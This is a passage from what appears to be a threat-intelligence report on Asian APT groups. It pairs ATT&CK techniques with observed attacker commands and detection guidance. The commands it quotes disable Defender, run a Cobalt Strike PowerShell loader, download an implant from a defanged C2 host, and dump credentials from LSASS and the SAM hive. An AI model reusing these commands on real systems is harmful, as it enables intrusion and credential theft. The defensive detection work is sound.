(CreateRemoteThread) can be used to create correlation\nrules:\n\n   - Injecting a DLL using LoadLibrary()\n\n   - Creating a remote thread in a critical Windows process\n\n###### Event source Log Event ID\n\nSysmon Sysmon 7, 8\n\n###### SIGMA rules\n\n   - Sigma-Generic-Dynamic-link Library Injection via LoadLibrary\n\n   - Sigma-Generic-Remote Thread creation to critical Windows process\n\n\n-----\n\n###### Process Injection: Process Hollowing T1055.012\n\n\n###### Basic description\n\nThe most popular way to implement Process Injection among Asian APT groups is Process Hollowing. This type\nof code injection relies on the capability to create a process in the suspended state. After a process is created,\nthe executable file image in the address space of the process is unmapped and the attacker's executable\nfile image is written in its place. After the signal to continue execution (WinAPI ResumeThread), the process\nexecutes the rewritten image beginning with the entry point that was written to the EAX register.\n\nSecurity solutions often scan the executable file of a process before the process is started. This means that\nthey have already concluded whether a process is \"harmless\" or not before the process is created, even if it is\ncreated in the suspended state. This helps attackers remain undetected for a longer period of time.\n\nThe Process Hollowing mechanism can be described as follows:\n\n###### 1\n\nThe attacker creates a process in the suspended state. To do so, the value CREATE_SUSPENDED\n(0x00000004) is passed in the dwCreationFlags parameter to the CreateProcess function.\n\n###### 2\n\nThen the attacker unmaps the image of the original executable file. The Native API function\n**NtUnmapViewOfSection is normally used for this purpose. The arguments passed to this function include**\nthe handle of the process intended for unmapping and the address of the original executable file image that\nthe attacker receives from the Process Environment Block (PEB).\n\n###### 3\n\nThen memory is allocated for the new executable file in the target process, often by using the VirtualAllocEx\nfunction. The address of the image obtained at step 2 is passed to this function in the lpAddress parameter.\n\n###### 4\n\nThen the attacker's executable file image is written to the address space of the process.\nThe WriteProcessMemory function is often used for this purpose.\n\n\n-----\n\nAfter successfully writing the image to the virtual address space of the target process, the attacker modifies\nthe thread context in the image by writing the EntryPoint value of the new executable file to the EAX register.\nThis may be done by using the GetThreadContext and SetThreadContext WinAPI functions, and by writing\ninstructions to switch to execution of the written payload (for example, using jmp instructions).\n\n###### 6\n\nAs the last step, the attacker resumes thread execution, often by using the ResumeThread API function.\n\n###### Examples of procedures\n\n**Example 1**\n\nAsian APT groups regularly use the Process Hollowing technique, and C:\\Windows\\System32\\svchost.exe is\noften the process image that they run.\n\nFor example, in a campaign targeting a government entity in Vietnam, an Asian APT group started the svchost.\nexe process in the suspended state and attempted to write malicious code to its address space.\n\n**Example 2**\n\nIn another campaign targeting organizations in Indonesia, attackers also attempted to start the process\n**C:\\Windows\\System32\\svchost.exe in the suspended state. In this case, the infected process c:\\windows\\**\nhelp\\help\\meupdate.exe served as the parent process.\n\n**Example 3**\n\nAPT groups predominantly choose legitimate processes as their target processes. In addition to svchost.exe,\nwe also observed the wusa.exe process being used like in the attack targeting Malaysia.\n\n\nParent_image_path: C:\\Program Files\\Common Files\\VLCMedia\\vlc.exe\nImage_path: C:\\Windows\\System32\\wusa.exe\n\n\n###### Detection\n\nUse of the Process Hollowing technique can be detected based on the Process Tampering event of the\nSysmon monitoring agent. This event occurs when the executable file image in the address space of a process\nis changed.\n\n\n-----\n\nFigure 49 Event Symson: Process Tampering\n\nThis event often occurs when browsers are running, which should be taken into consideration when writing\ncorrelation rules.\n\nYou can also distinguish and detect certain patterns, and thereby significantly reduce the attack surface for\nattackers.\n\nHere is an example approach that can be used to create appropriate detection logic. Here is the normal\nWindows behavior related to the svchost.exe process:\n\n###### 1\n\nThe svchost.exe image is located in the directory %WINDIR%\\System32\n\n###### 2\n\nOnly the services.exe process can serve as the parent process of the svchost.exe process\n\n###### 3\n\nThe command line of the svchost.exe process will always match the template: svchost.exe -k [COMMAND]\n\n\n-----\n\nAlthough any disruption of \"normal\" behavior can be viewed as potentially malicious activity, some company-\nspecific software or environments may result in false positives.\n\nThe detection logic can be expanded by writing detection rules for anomalous behavior related to other\nprocesses in addition to svchost.exe.\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nSysmon Sysmon 1, 25\n\n###### SIGMA rules\n\n   - Sigma-Generic-Executing File Named as System Tool in Unusual Directory\n\n   - Sigma-Generic-Anomaly in the Windows Critical Process Tree\n\n   - Sigma-Generic-Shell Creation by Critical Windows Process\n\n   - Sigma-Generic-Svchost.exe Start with no Standard Parameters\n\n   - Sigma-Generic-Rundll32 Start with no Standard Parameters\n\n   - Sigma-Generic-Process Hollowing\n\n\n-----\n\n###### Impair Defenses: Disable or Modify Tools T1562.001\n\n Basic description\n\nAsian APT groups often attempt to disable specific security solutions(such as active scanning of files by\nWindows Defender) that hinder their intended malicious activity. To disable security measures, APT groups\nuse various means such as tools specially created for this purpose, registry changes, PowerShell, LOLBAS, and\nothers.\n\nAttackers also often use legitimate and signed vulnerable drivers to disable protection mechanisms from\nkernel mode. This type of attack was named BYOVD (Bring Your Own Vulnerable Driver). In this case, attackers\ninstall a driver with known vulnerabilities in the target system, then exploit those vulnerabilities to execute code\nin kernel mode.\n\n###### Examples of procedures\n\n**Example 1**\n\nIn an attack that we observed, an Asian APT group used PowerShell to disable the real-time monitoring option\nin Windows Defender:\n\nPowerShell -exec bypass -command Set-MpPreference -DisableRealtimeMonitoring $True\nPowerShell -exec bypass -command Get-MpPreference\n\n**Example 2**\n\nThe attackers used PowerShell to add their malicious files to Windows Defender exclusions:\n\n\"$windir\\$system32\\WindowsPowerShell\\v1.0\\PowerShell.exe\" Add-MpPreference -ExclusionPath\n\"$user\\$appdata\\htOTEVF.exe\"\n\n\n-----\n\n###### Detection\n\nTo detect disabling of the security solutions, you can look for process termination events and/or service state\nchange events. In this case, you need to analyze any termination of processes of security solutions while\ndisregarding cases in which a process was disabled for reasons unrelated to a potential attack (for example, if\na specific security tool was restarted).\n\nProcedures that exploit vulnerable drivers are difficult to detect. However, you can look for driver loading\nevents that contain a driver file hash. If a driver hash is on the list of vulnerable drivers that are exploited by\nattackers, you must investigate the origin of that file. This list can be compiled using multiple sources, for\nexample, loldrivers [10].\n\nAnother detection approach is to look for events involving process creation and execution of PowerShell script\nblocks.\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nSysmon Sysmon 1, 6, 13\n\nMicrosoft-Windows-PowerShell/\nPowerShell 4103, 4104\nOperational\n\n###### SIGMA rules\n\n- Sigma-Generic-Disabling Critical Service\n\n- Sigma-Generic-Disabling SmartScreen Protection via Registry\n\n- Sigma-Generic-Disabling Windows Defender via Dism\n\n- Sigma-Generic-Disabling Windows Defender via Registry\n\n- Sigma-Generic-Windows Defender Exclusions Modification via Registry\n\n- Sigma-Generic-Windows Defender Modification via PowerShell\n\n10\n\nloldrivers\n\n\n[Learn more](https://www.loldrivers.io/)\n\n\n-----\n\n###### Obfuscated Files or Information T1027\n\n\n###### Basic description\n\nTo bypass security solutions, attackers employ obfuscation. Obfuscation is a process of confusing and\ncomplicating. APT actors use various methods to obfuscate the contents of their malicious files. For example,\nthey can encrypt or compress them, obfuscate their code, rename variables or functions to conceal their\npurpose, and insert unintelligible code or comments to hinder analysis.\n\nWhen executing commands in the Windows command line or PowerShell, attackers often try to conceal\nthe execution of malicious commands. Actors replace actual commands with obfuscated versions using\na combination of special characters. Attackers also use scripts to make it more difficult to track specific\nexecutable commands, and these scripts can also be additionally obfuscated.\n\nMethods for obfuscating the PowerShell command line employed by Asian APT groups:\n\n###### 1\n\nBase64 encoding. Attackers often use Base64 for obfuscation. Hackers decode their Base64-encoded\ncommand line while executing a command by using the \"-EncodedCommand\" parameter or the\nFromBase64String method, for example:\n\n[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64_command))\n\n###### 2\n\nEscape characters:\n\na. i`w`r\nb. i’w’r\nc. i”w”r\n\nHere iwr is an alias of the Invoke-WebRequest command.\n\n###### 3\n\nString concatenation. This method consists of breaking up PowerShell commands into multiple strings that will\nnot set off alerts in security products, and then re-combining them when they are executed.\n\n\n-----\n\n$s1 = “Invoke”\n$s2 = “-Web”\n$s3 = “Request”\n$command = $s1 + $s2 + $s3\n& $command\n\n###### Examples of procedures\n\nLet's examine some different procedures encountered among Asian APT groups and analyze their\nobfuscation.\n\n**Example 1**\n\nIn the incident in Pakistan that we examined, the APT group used custom-written PowerShell scripts. One\nscript was used to collect data on the system, while the second script was used for data exfiltration:\n\nFigure 50 Custom PowerShell Script (1)\n\n\n-----\n\nFigure 51 Custom PowerShell Script (2)\n\nThe second script was encoded in Base64. It was decoded and executed by the first script. The contents of\nthe first script were also encoded into one Base64 string and were saved to a file in a temporary directory.\n\n\n$temp\\Err_36d96944_6318.log\n\n\nTo run the script, the operator added the following task to the Task Scheduler:\n\n\n$system32\\WindowsPowerShell\\v1.0\\PowerShell.EXE -c\n\"$ctnt=Get-Content $temp\\Err_36d96944_6318.log;PowerShell -enc $ctnt;\"\n\n\n-----\n\nHere, the contents of the $temp\\Err_36d96944_6318.log file containing the encoded script are written to the\n$ctnt variable. Then PowerShell decodes the Base64 encoding by using the truncated parameter -enc from\n-EncodedCommand and runs the script.\n\n**Example 2**\n\nIn an attack targeting Indonesia, we observed the following example of obfuscation. The executable file\nused for the service was cmd.exe with parameters for running a script in PowerShell. This script contained\nCobalt Strike in the form of binary (shell) code with a size of ~100 bytes, was executed in the context of the\nPowerShell process, and used the Win32 API.\n\n\"C:\\Windows\\system32\\cmd.exe /b /c start /b /min PowerShell.exe -nop -w hidden -noni -c\n\"if([IntPtr]::Size -eq 4){$b=$env:windir+\n\n'\\sysnative\\WindowsPowerShell\\v1.0\\PowerShell.exe'}else{$b='PowerShell.exe'};$s=New-\nObject System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop\n-w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object\nSystem.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.\nConvert]::FromBase64String(''H4sIAIKCBWACA7VWa2+\n\nbSBT9nEj5D6iyZFAcP5I0bSJVWsY2McR2jYlxbK+1IjDA1MMjMDgm3f73vYMhTbdp....\n\n'))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';\n$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;\n$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\"\n\n**Example 3**\n\nAs another example of obfuscation, GoogleUpdate.exe extracts a second-stage \"Stowaway\" implant by\nexecuting the following:\n\nPowerShell \"Start-BitsTransfer -Source hxxp://security.lomiasecure[.]net/crx/node.txt -\nDestination C:\\\\Users\\\\public\\\\node.txt -transfertype download\"\nPowerShell if($InputString = Get-Content 'C:\\\\Users\\\\public\\\\node.txt'){\n\n[System.IO.File]::WriteAllBytes('C:\\\\Users\\\\public\\\\node.exe',\n\n[System.Convert]::FromBase64String($InputString))}\n\nThe sample uses BITS Jobs to access the C2 and download the text file node.txt, which is converted into an\nexecutable file named node.exe (MD5: 344edbebb97ed8dfe79805a721b4048b).\n\n\n-----\n\n###### Detection\n\nSeveral methods are employed to detect obfuscation. One way is to determine the entropy value, which is a\nmeasure of data uncertainty. When data compression or encryption algorithms are applied, the frequencies of\noccurrence of bytes are redistributed and entropy increases.\n\nSome PowerShell obfuscation methods can be detected based on patterns in the command line:\n\n- Use of the EncodedCommand parameter and its truncated versions\n\n- Use of various encryption and compression methods in PowerShell:\n\n\nFromBase64String()\nGZipStream\nDecompress\n\n\n\n- Multiple use of escape characters:\n\n\nIN`V`o`Ke-eXp`ResSIOn (Ne`W-ob`ject Net.WebClient).DownloadString\n\n\n\n- Combination of line concatenation usage patterns:\n\n\n&('In'+'voke-Expressi'+'o'+'n') (.('New-Ob'+'jec'+'t') Net.WebClient).DownloadString\n&(\"{2}{3}{0}{4}{1}\"-f 'e','Expression','I','nvok','-') (&(\"{0}{1}{2}\"-f'N','ew-O','bject') Net.WebClient).\nDownloadString\n\n\n\n- Commands written in reverse; variants of commands written in reverse should be added to detection rules\nfor suspicious PowerShell commands:\n\n\ndaolnwoD (Download)\ntneilCbeW (WebClient)\n\n\n-----\n\nPowerShell is a very powerful tool that enables attackers to modify the appearance of the command line used\nto start a process so that analysts will have a very difficult time identifying command execution. attackers are\nalways inventing new obfuscation techniques. New obfuscation methods are continually under development;\ntherefore, you should regularly revise and update SIEM detection rules to keep up with attackers and improve\nyour level of security.\n\n###### Log Event ID\n\nSecurity 4688\n\nMicrosoft-Windows-PowerShell/Operational 4103, 4104\n\nSysmon 1\n\n###### SIGMA rules\n\n   - Sigma-Generic-Encoded/decoded PowerShell Сode Execution (ps_script)\n\n   - Sigma-Generic-Obfuscation via Escape Characters in Command Line\n\n   - Sigma-Generic-XOR-ed PowerShell Command\n\n   - Sigma-Generic-XOR-ed PowerShell Command (ps_script)\n\n\n-----\n\n###### Masquerading T1036\n\n Basic description\n\nThe Masquerading T1036 technique is the simplest in terms of understanding how it works and how to detect\nit. Despite its simplicity, it is an extremely reliable indicator of an attacker's presence in an infrastructure.\nThis technique is one of the methods used by Asian APT groups to conceal their activity and bypass various\nsecurity mechanisms. It involves the use of legitimate processes, files, or commands to disguise malicious\nactivity as normal operations or legitimate applications. An attacker may resort to using already familiar names\nof processes in the operating system, creating files with legitimate names in shared directories, and starting\nservices with well-known names of processes and descriptions.\n\nAfter analyzing dozens of incidents throughout the world, we compiled a list of the most frequently used\ndirectories where Asian APT groups dropped their executable files during an attack.\n\nThe following directories (sorted by popularity) are encountered in the overwhelming majority of cases:\n\n   - C:\\Windows\\Temp\n\n   - C:\\Windows\\tasks\n\n   - C:\\Windows\\help\n\n   - C:\\Windows\\help\\help\n\n    - C:\\Intel\n\n   - C:\\intel\\logs\n\n   - C:\\perflogs\n\n   - C:\\system\n\nWe recommend paying close attention to these directories to identify any instances of unfamiliar processes or\nuser accounts creating executable files in these directories.\n\nIn the overwhelming majority of observed cases that implemented the technique known as Hijack Execution\nFlow: DLL Side-Loading T1574.002, the perpetrator attempts to drop a legitimate executable file and malicious\nlibrary into the following paths:\n\n\n\n- C:\\Program Files\n\n- C:\\ProgramData\n\nIn this case, it can be rather difficult to track the creation of all executable files in these directories because\nthey store a large amount of legitimate software in the operating system. The best option would be to profile\nthe software that is allowed and installed on computers in your domain. Asian APT groups often prefer to\nmasquerade as various IT security products, for example:\n\n\n-----\n\n###### MD5 File name\n\n4CAC6C6CAF0C849AFE8CB3DB925AB69D C:\\ProgramData\\avast\\wsc.dll\n\n750EF49AFB88DDD52F6B0C500BE9B717 C:\\Windows\\avpui.exe\n\n###### Examples of procedures\n\nA frequently used type of masquerading is to mimic legitimate operating system processes for the purpose\nof obstructing efforts by cybersecurity experts to analyze the system. We can distinguish similar patterns\namong Asian APT groups in this type of scenario. This behavior is primarily observed when they implement\nthe techniques known as Hijack Execution Flow: DLL Side-Loading T1574.002 and Process Injection: Process\nHollowing T1055.012 (see the Techniques section for a detailed description). The attacker delivers a malicious\nlibrary and legitimate software to intercept a thread and run their own code in the context of a legitimate\nprocess, or injects code by creating a process in the suspended state. Then a process is created with a\nlegitimate name, the executable file in the address space of the process is replaced, and the real malicious\nactivity begins. This activity can be detected by identifying anomalies in parent and child processes in\nWindows.\n\n###### Detecting anomalies in parent and child processes with Kaspersky TIP\nFigure 52\n###### capabilities\n\n\n-----\n\nSimilar anomalies can be detected in the tree of critical Windows processes after code from malicious\nlibraries used by Asian APT groups is executed. This type of library was detected during an incident in a\ngovernment-run company in Russia. It was named C:\\ProgramFiles\\CommonFiles\\services\\avg\\CRYPTBASE.dll\n(MD5:AC40DD84292A7F594AD7A7DD20631D78).\n\n###### Suspicious Activity detected with Kaspersky TIP capabilities \nFigure 53\n###### (anomaly in the critical process tree)\n\n Detection\n\nTo detect this technique, you are advised to follow the guidelines of the \"Find Evil – Know Normal” [11] poster\nproduced by the SANS Institute. This poster provides an illustrative guide to detect malicious activity by\ncomparing normal behavior of the OS with potentially suspicious or malicious activity. It describes the normal\nbehavior of a process, and legitimate combinations of child processes and parent processes. Alerts should be\ngenerated for events that deviate from the norm. You are advised to carefully examine our rule named \"SigmaGeneric-Anomaly in the Windows Critical Process Tree,\" which helped us through difficult situations many\ntimes.\n\nYou must also track events involving the creation of files that have a legitimate process name but an unusual\npath in the system, for example: C:\\ProgramData\\svchost\\svchost.exe. You can use this detection logic to\ntrack process creation events.\n\n11\n\nFind Evil\n\n\n[Learn more](https://www.sans.org/posters/hunt-evil/)\n\n\n-----\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nSysmon Sysmon 1, 11\n\n###### SIGMA rules\n\n   - Sigma-Generic-Anomaly in the Windows Critical Process Tree\n\n   - Sigma-Generic-Svchost.exe Start with no Standard Parameters\n\n   - Sigma-Generic-Shell Creation by Critical Windows Process\n\n   - Sigma-Generic-Rundll32 Start with no Standard Parameters\n\n\n-----\n\n###### Masquerading: Match Legitimate Name or Location T1036.005\n\n\n###### Basic description\n\nAPT actors may disguise themselves as legitimate processes for malicious purposes. Anomalies can be\ndetected in process trees (non-standard child and parent processes). Asian APT groups may also use simpler\nmethods. For example, they use files with names that are identical or similar to system files on the targeted\ncomputer to confuse security experts.\n\n###### Suspicious Activity detcted with Kaspersky TIP capabilities \nFigure 54\n###### (files with the same names or similar to system ones)\n\n Examples of procedures\n\n**Example 1**\n\nWebDav-O malware at the path C:\\windows\\system32\\conhost64.exe (conhost64.exe is a fake name, and the\nreal name is C:\\Windows\\system32\\conhost.exe).\n\n\ncmd.exe /c C: & cd\\ & cd \"\" & dir \\\\<ip>\\c$\\windows\\system32\\conhost64.exe\ncmd.exe /c C: & cd\\ & cd \"\" & wmic /node:<ip> /user:<domain>\\<username> /password:<password>\nprocess call create \"cmd /c $system32\\conhost64.exe\"\n\n\n-----\n\n**Example 2**\n\nIn a campaign targeting a government institution in the Pacific region, an attacker used an archiver disguised\nwith the name of the svchost.exe process: C:\\Windows\\ime\\svchost.exe\n(MD5: D263D26A2BE8D971273F6C9FA2EC6608).\n\n\nC:\\Windows\\ime\\svchost.exe a -r -hpzxcv@wsx -ta20220627 C:\\Windows\\ime\\microsoft.dat c:\\*.doc*\nd:\\*.doc* e:\\*.doc* c:\\*.pdf* d:\\*.pdf* e:\\*.pdf* h:\\*.doc* h:\\*.xls* h:\\*.pdf* f:\\*.doc* f:\\*.xls* f:\\*.pdf* g:\\*.doc*\ng:\\*.xls* g:\\*.pdf*\n\n\n**Example 3**\n\nIn January of 2022, Kaspersky ICS CERT experts detected a wave of targeted attacks against companies\nof the military-industrial complex and government institutions in several countries of Eastern Europe and\nin Afghanistan [12]. Some of the malicious programs used in these attacks were observed in earlier attacks\nconducted by the APT group known as IronHusky. These incidents also involved implementations of the\nsubtechnique known as Match Legitimate Name or Location T1036.005.\n\n###### MD5 File name\n\n0xEBCFFECE1B1AF517743D3DFFDE72CB43 c:\\programdata\\conhost.exe\n\n0x40EB08F151859C1FE4DC8E6BC466B06F c:\\programdata\\uconhost.exe\n\n7FE40325F0CEF8A32E69A6087EBC7157 c:\\programdata\\install.exe\n\n17FA7898D040FA647AFA4467921A66CF c:\\programdata\\install.exe\n\n**Example 4**\n\nWe also detected similar behavior from the ToddyCat group. This is an APT group that was detected\nin December of 2020 targeting high-ranking officials in Europe and Asia. The group deploys a multistage infection chain consisting of various custom loaders and tools. C:\\Windows\\avpui.exe (MD5:\n750EF49AFB88DDD52F6B0C500BE9B717) is an executable file that steals passwords from browsers and\nimitates Kaspersky Anti-Virus:\n\n12\n\nTargeted attack\n\n\n[Learn more](https://ics-cert.kaspersky.com/publications/reports/2022/08/08/targeted-attack-on-industrial-enterprises-and-public-institutions/)\n\n\n-----\n\nFigure 55 Malicoius file disguised as Kaspersky Anti-Virus\n\nIn this incident, we also detected a malicious file named GoogleUpdate, which created an administrative\naccount on the local machine:\n\nC:\\program files (x86)\\google\\update\\googleupdate.exe\nMd5: b65786eaedc96827855abca996fa0836\n\n###### Detection\n\nThe main way to detect this subtechnique is to monitor the startup of processes and creation of files that are\nnamed as standard system files but are located in non-standard directories. Attackers primarily try to disguise\nthemselves as files located in the following directories:\n\n   - System32\n\n  - SysWOW64\n\n   - WinSxS\n\n\n-----\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nSysmon Sysmon 1, 11\n\n###### SIGMA rules\n\n   - Sigma-Generic-Executing File Named as System Tool in Unusual Directory\n\n\n-----\n\n###### Masquerading: Masquerade Task or Service T1036.004\n\n\n###### Basic description\n\nThis subtechnique is employed by attackers to conceal their malicious activity by imitating or substituting\nlegitimate tasks or services of the operating system. Threat actors primarily modify the attributes of a task\nor service so that it looks like a normal and legitimate process or service of the operating system. They may\nmodify the name or path of an executable file, command-line parameters, or other properties related to a\nprocess or service.\n\nAsian APT groups disguise services in their operations to avoid detection and evade security mechanisms.\nThey may create fake tasks or services that imitate legitimate operating system components to conceal their\nactivity and deceive system monitoring tools.\n\n###### Examples of procedures\n\n**Example 1**\n\nAs described above, the APT group known as Dark Seoul used this technique to disguise its services as\nlegitimate one. Services were created when executing their payload and when using the SMBExec tool.\n\n\n%SystemRoot%\\System32\\svchost.exe -k msupdate2\nSERVICE_CREATE\nS-1-5-18 (NT AUTHORITY\\SYSTEM)\n\nEvent : 7045\nService Name: Windows Host Management\nService File Name: cmd /K start C:\\Windows\\setup\\svchost.exe\nService Type: user mode service\nService Start Type: auto startService Account: LocalSystem\n\nEvent : 7045\nService Name: Windows Service Management\nService File Name: cmd /K start C:\\Windows\\setup\\winhost.exe\nService Type: user mode service\nService Start Type: auto start\nService Account: LocalSystem\n\n\n-----\n\n**Example 2**\n\nIn a similar incident, an attacker used the WpnUserService_2727f.dll library to start a service with the same\nname as the legitimate service known as the Windows Push Notification User Service.\n\n**Example 3**\n\nIn Russia, we detected another case in which a running library created a service with the legitimate name\nService_name: NvContainerSvc.\n\n###### MD5 File name\n\n0AF1A8B5896A79FBB7A9BA551016DF8B c:\\ProgramData\\microsoft\\nvidia\\version.dll\n\nBased on KTAE, this sample is attributed to the MATA family with a 96% probability. MATA is a malicious\nframework for network equipment running Windows and Linux that has been used in a wide range of activity\nsince 2018. It is assumed to belong to the group known as Lazarus.\n\nFigure 56 Kaspersky Threat Attribution Engine report\n\n\n-----\n\nFigure 57 Sample detonation in Kaspersky TIP\n\n###### Detection\n\nIt is difficult to detect the use of this technique because the attacker constantly invents new names and\ndescriptions for their malicious tasks and services. We recommend that you monitor the creation and startup\nof services that have parts of legitimate names and descriptions but are not from their original processes.\nFor example, a service that is created with the description \"google\" and comes from a process other than\n\"$programfiles\\Google\\Update\\GoogleUpdate.exe\" most likely indicates malicious activity. Although this\nmethod requires efficient filtering of false positives in your specific infrastructure, it ultimately brings good\nresults.\n\nIn the description of their service, attackers often warn that their supposedly \"critical\" service should not be\nstopped or disabled because this would disrupt an important component in the system. You can use this trend\nto build a correlation rule that tracks the keywords \"if\", \"stop\", and \"disable\" in a service description.\n\n\n-----\n\n###### Event source Log Event ID\n\nWindows System 7045\n\nWindows Security 4688, 4697\n\nWindows TaskScheduler 106, 200, 201\n\nSysmon Sysmon 1, 13\n\n###### SIGMA rules\n\n   - Sigma-Generic-Creating Windows Service appearing to be legitimate\n\n\n-----\n\n##### Credential Access TA0006\n\n###### OS Credential Dumping T1003\n\n Basic description\n\nThreat actors may attempt to dump account login credentials from the operating system or other software.\nThese credentials are normally in the form of a password hash or cleartext password. The obtained credentials\ncan then be used for lateral movement and access to restricted information.\n\n\n-----\n\n###### OS Credential Dumping: LSASS Memory T1003.001\n\n\n###### Basic description\n\nThe subtechnique known as OS Credential Dumping: LSASS Memory T1003.001 is used by attackers to obtain\ncredentials in a Windows OS. This technique involves obtaining account credentials by dumping the memory of\nthe process known as LSASS (Local Security Authority Subsystem Service) in Windows operating systems.\n\nThe LSASS process is responsible for user authentication and management of the security of account\ncredentials such as passwords. Therefore, it contains important data such as password hashes, session keys,\nand authentication tokens, which can be exploited by attackers to gain privileged access to the system or to\nextend their attacks to other resources on the network.\n\nThe most popular tools employed by attackers are the following:\n\n- Mimikatz\n\n- ProcDump\n\n- Rubeus\n\n- LaZagne\n\n- Seth\n\n- PowerSploit\n\n- PowerShell Empire\n\n- secretsdump.py\n\n- lsassy\n\n- pypykatz\n\n###### Examples of procedures\n\nAsian APT groups use the following methods for implementing this technique:\n\n**Example 1**\n\nIn Indonesia, Asian threat actors chose an unusual Living-Off-the-Land approach and obtained a memory\ndump of the LSASS process by employing DumpMinitool.exe, which is a legitimate tool delivered together\nwith Microsoft Visual Studio.\n\n\nC:\\Windows\\System32\\cmd.exe /C $windir\\help\\help\\DumpMinitool.exe --file 1.txt --processId <lsass_\npid> --dumpType Full\n\n\n-----\n\n**Example 2**\n\nAsian APT groups often use the ProcDump.exe tool for a memory dump of the lsass.exe process. In one of the\ninvestigations conducted by GERT, this tool was detected in a web service directory:\n\n\nC:\\inetpub\\wwwroot\\aspnet_client\\Procdump.exe\n\n\nExample startup:\n\n\nprocdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\mem.dmp\n\n\n**Example 3**\n\nHere's another example of using the LoLBin tool after it was renamed to C:\\Windows\\System32\\comsvcs.dll:\n\n\nrundll32.exe C:\\Windows\\System32\\111.dll, MiniDump 880 lsass.dmp full\n\n\n**Example 4**\n\nMimikatz is very popular among attackers, including Asian APT groups. They primarily use various modifications\nof this popular tool.\n\n\nC:\\Windows\\System32\\logfiles\\msdol.exe privilege::debug sekurlsa::logonpasswords exit\n\n\n**Example 5**\n\nIn some attacks involving Asian APT groups, one of the other ways they used to gain access to lsass.exe\nmemory was using an SSP provider.\n\n\nC:\\Windows\\Help\\Help\\ssp.exe C:\\Windows\\Help\\Help\\Dll7.dll\n\n\n-----\n\nssp.exe (MD5: AF893448B4D1862C42D6E1CC3AA8878D) is an SSP loader [13], that receives a DLL library as an\nargument. In this case, the DLL library named Dll7.dll (MD5: 871CC8F514011F4796982D5E6E5F35C1) is passed\nto the loader and loaded into the lsass.exe process.\n\n**Example 6**\n\nAnother method to obtain a memory dump of lsass.exe that was observed in the Indonesian incident is to steal\nthe handle of the lsass.exe process.\n\nC:\\Windows\\help\\help\\duplicatedump.exe -f test -c C:\\Windows\\Help\\Help\\LSAPlugin.dll\n\nduplicatedump.exe [14] is a tool used for stealing passwords from the lsass.exe process by duplicating the\nexisting handle of the lsass.exe process to get access to the address space of this process.\n\nduplicatedump.exe\nMD5: AD2C078AE847EDE5C66494F0DDECD35C\nLSAPlugin.dll\nMD5: EC38F08AAAEADD833B0B356E2783FFD4\n\n**Example 7**\n\nAsian threat actors use many variations of custom-written tools as well as popular tools such as Mimikatz.\n\nThe library EC38F08AAAEADD833B0B356E2783FFD4 has one exportable function named \"DO\" that is tasked\nwith using the API AddSecurityPackage (via RPC) to force the lsass.exe process to load the twindump.dll\nlibrary.\n\n13 14\n\nSSP DuplicateDump\n\n[Learn more](https://github.com/jas502n/mimikat_ssp) [Learn more](https://github.com/Hagrid29/DuplicateDump)\n\n\n-----\n\nFigure 58 Decompiled malicious library\n\nThis technique can be detected by tracking unsigned libraries being loaded into the lsass.exe process\n\n###### Detection\n\nTo detect attacks related to the technique known as OS Credential Dumping: LSASS Memory T1003.001, you\nare advised to employ the following methods:\n\nUse antivirus software and other tools to detect malicious programs such as Mimikatz, ProcDump, and others\nthat may be used to gather account credentials from LSASS memory.\n\nConsider the possibility of tracking attempts to access lsass.exe process memory (Process Accessed). This\ncan be done using an EDR solution by tracking events based on the WinAPI OpenProcess() function, and by\nusing the Sysmon monitoring agent.\n\nTo save a memory dump or load a library into the lsass.exe process, read/write permissions are required.\n\nBelow is a list of access rights and their numerical representations:\n\n\n-----\n\nFigure 59 Access rights to the process and decoding their meaning\n\nDetection can be based on events involving queries to a process with the following rights:\n\n\nPROCESS_VM_READ (0x00000010)\nPROCESS_VM_WRITE (0x00000020)\n\n\nFor example, the following regular expression includes all possible combinations of rights with read or write\naccess:\n\n\n^0x\\w*[1235679abdef]\\w$\n\n\n-----\n\nFigure 60 Combination of process access rights to read or write\n\nIf your security solution can perform bitwise operations, you can check for the following conditions:\n\nGrantedAccess & 0x00000010 == 0x00000010\nGrantedAccess & 0x00000020 == 0x00000020\n\nMost EDR solutions track Image Loaded events (loading an image into a process). This event can be used to\ndetect the following anomalies:\n\n\n\n- Loading a DLL from a shared directory into the lsass.exe process\n\n- Loading an unsigned DLL into the lsass.exe process\n\nYou can additionally track the creation of a remote thread in the lsass.exe process (Remote Thread Created)\nfrom a non-standard process. Startup of memory dump tools can be detected based on Process Created\nevents.\n\n\n-----\n\n###### Event source Log Event ID\n\nWindows Security 4688, 4656\n\nSysmon Sysmon 1, 6, 7, 8, 10\n\n###### SIGMA rules\n\n   - Sigma-Generic-Image Loaded into lsass.exe\n\n   - Sigma-Generic-Lsass Dump via LOLBin\n\n   - Sigma-Generic-LSASS Memory Access via Leaked Handle Seclogon\n\n   - Sigma-Generic-Process Dump via Comsvcs.dll\n\n   - Sigma-Generic-Suspicious LSASS Memory Access\n\n\n-----\n\n###### OS Credential Dumping: Security Account Manager T1003.002\n\n\n###### Basic description\n\nThe technique known as OS Credential Dumping: Security Account Manager T1003.002 is also used by\nattackers to get account credentials. This subtechnique involves extracting account credentials from the\nSecurity Account Manager (SAM) database in Windows operating systems.\n\nSAM contains information on users and user groups, stores user password hashes, and is required for login\nauthentication. It is used to manage user accounts, implement access control, and apply security policies in\nWindows.\n\nThe SAM file (SAM hive) is located in the folder C:\\Windows\\System32\\Config and is accessible only to the\nSystem Account when the operating system is started. Although the SAM file is protected from direct readand-edit access, attackers use various methods to bypass this restriction.\n\n###### Examples of procedures\n\nMost Asian APT groups that we observed implement this technique by using the standard reg.exe tool and\nsaving registry hives to shared directories in the operating system.\n\n\n$system32\\reg.exe reg save hklm\\sam $public\\videos\\sam.hive\n$system32\\reg.exe reg save hklm\\security $public\\videos\\security.hive\n$system32\\reg.exe reg save hklm\\system $public\\videos\\system.hive\n\n\nThey also frequently save the hives to 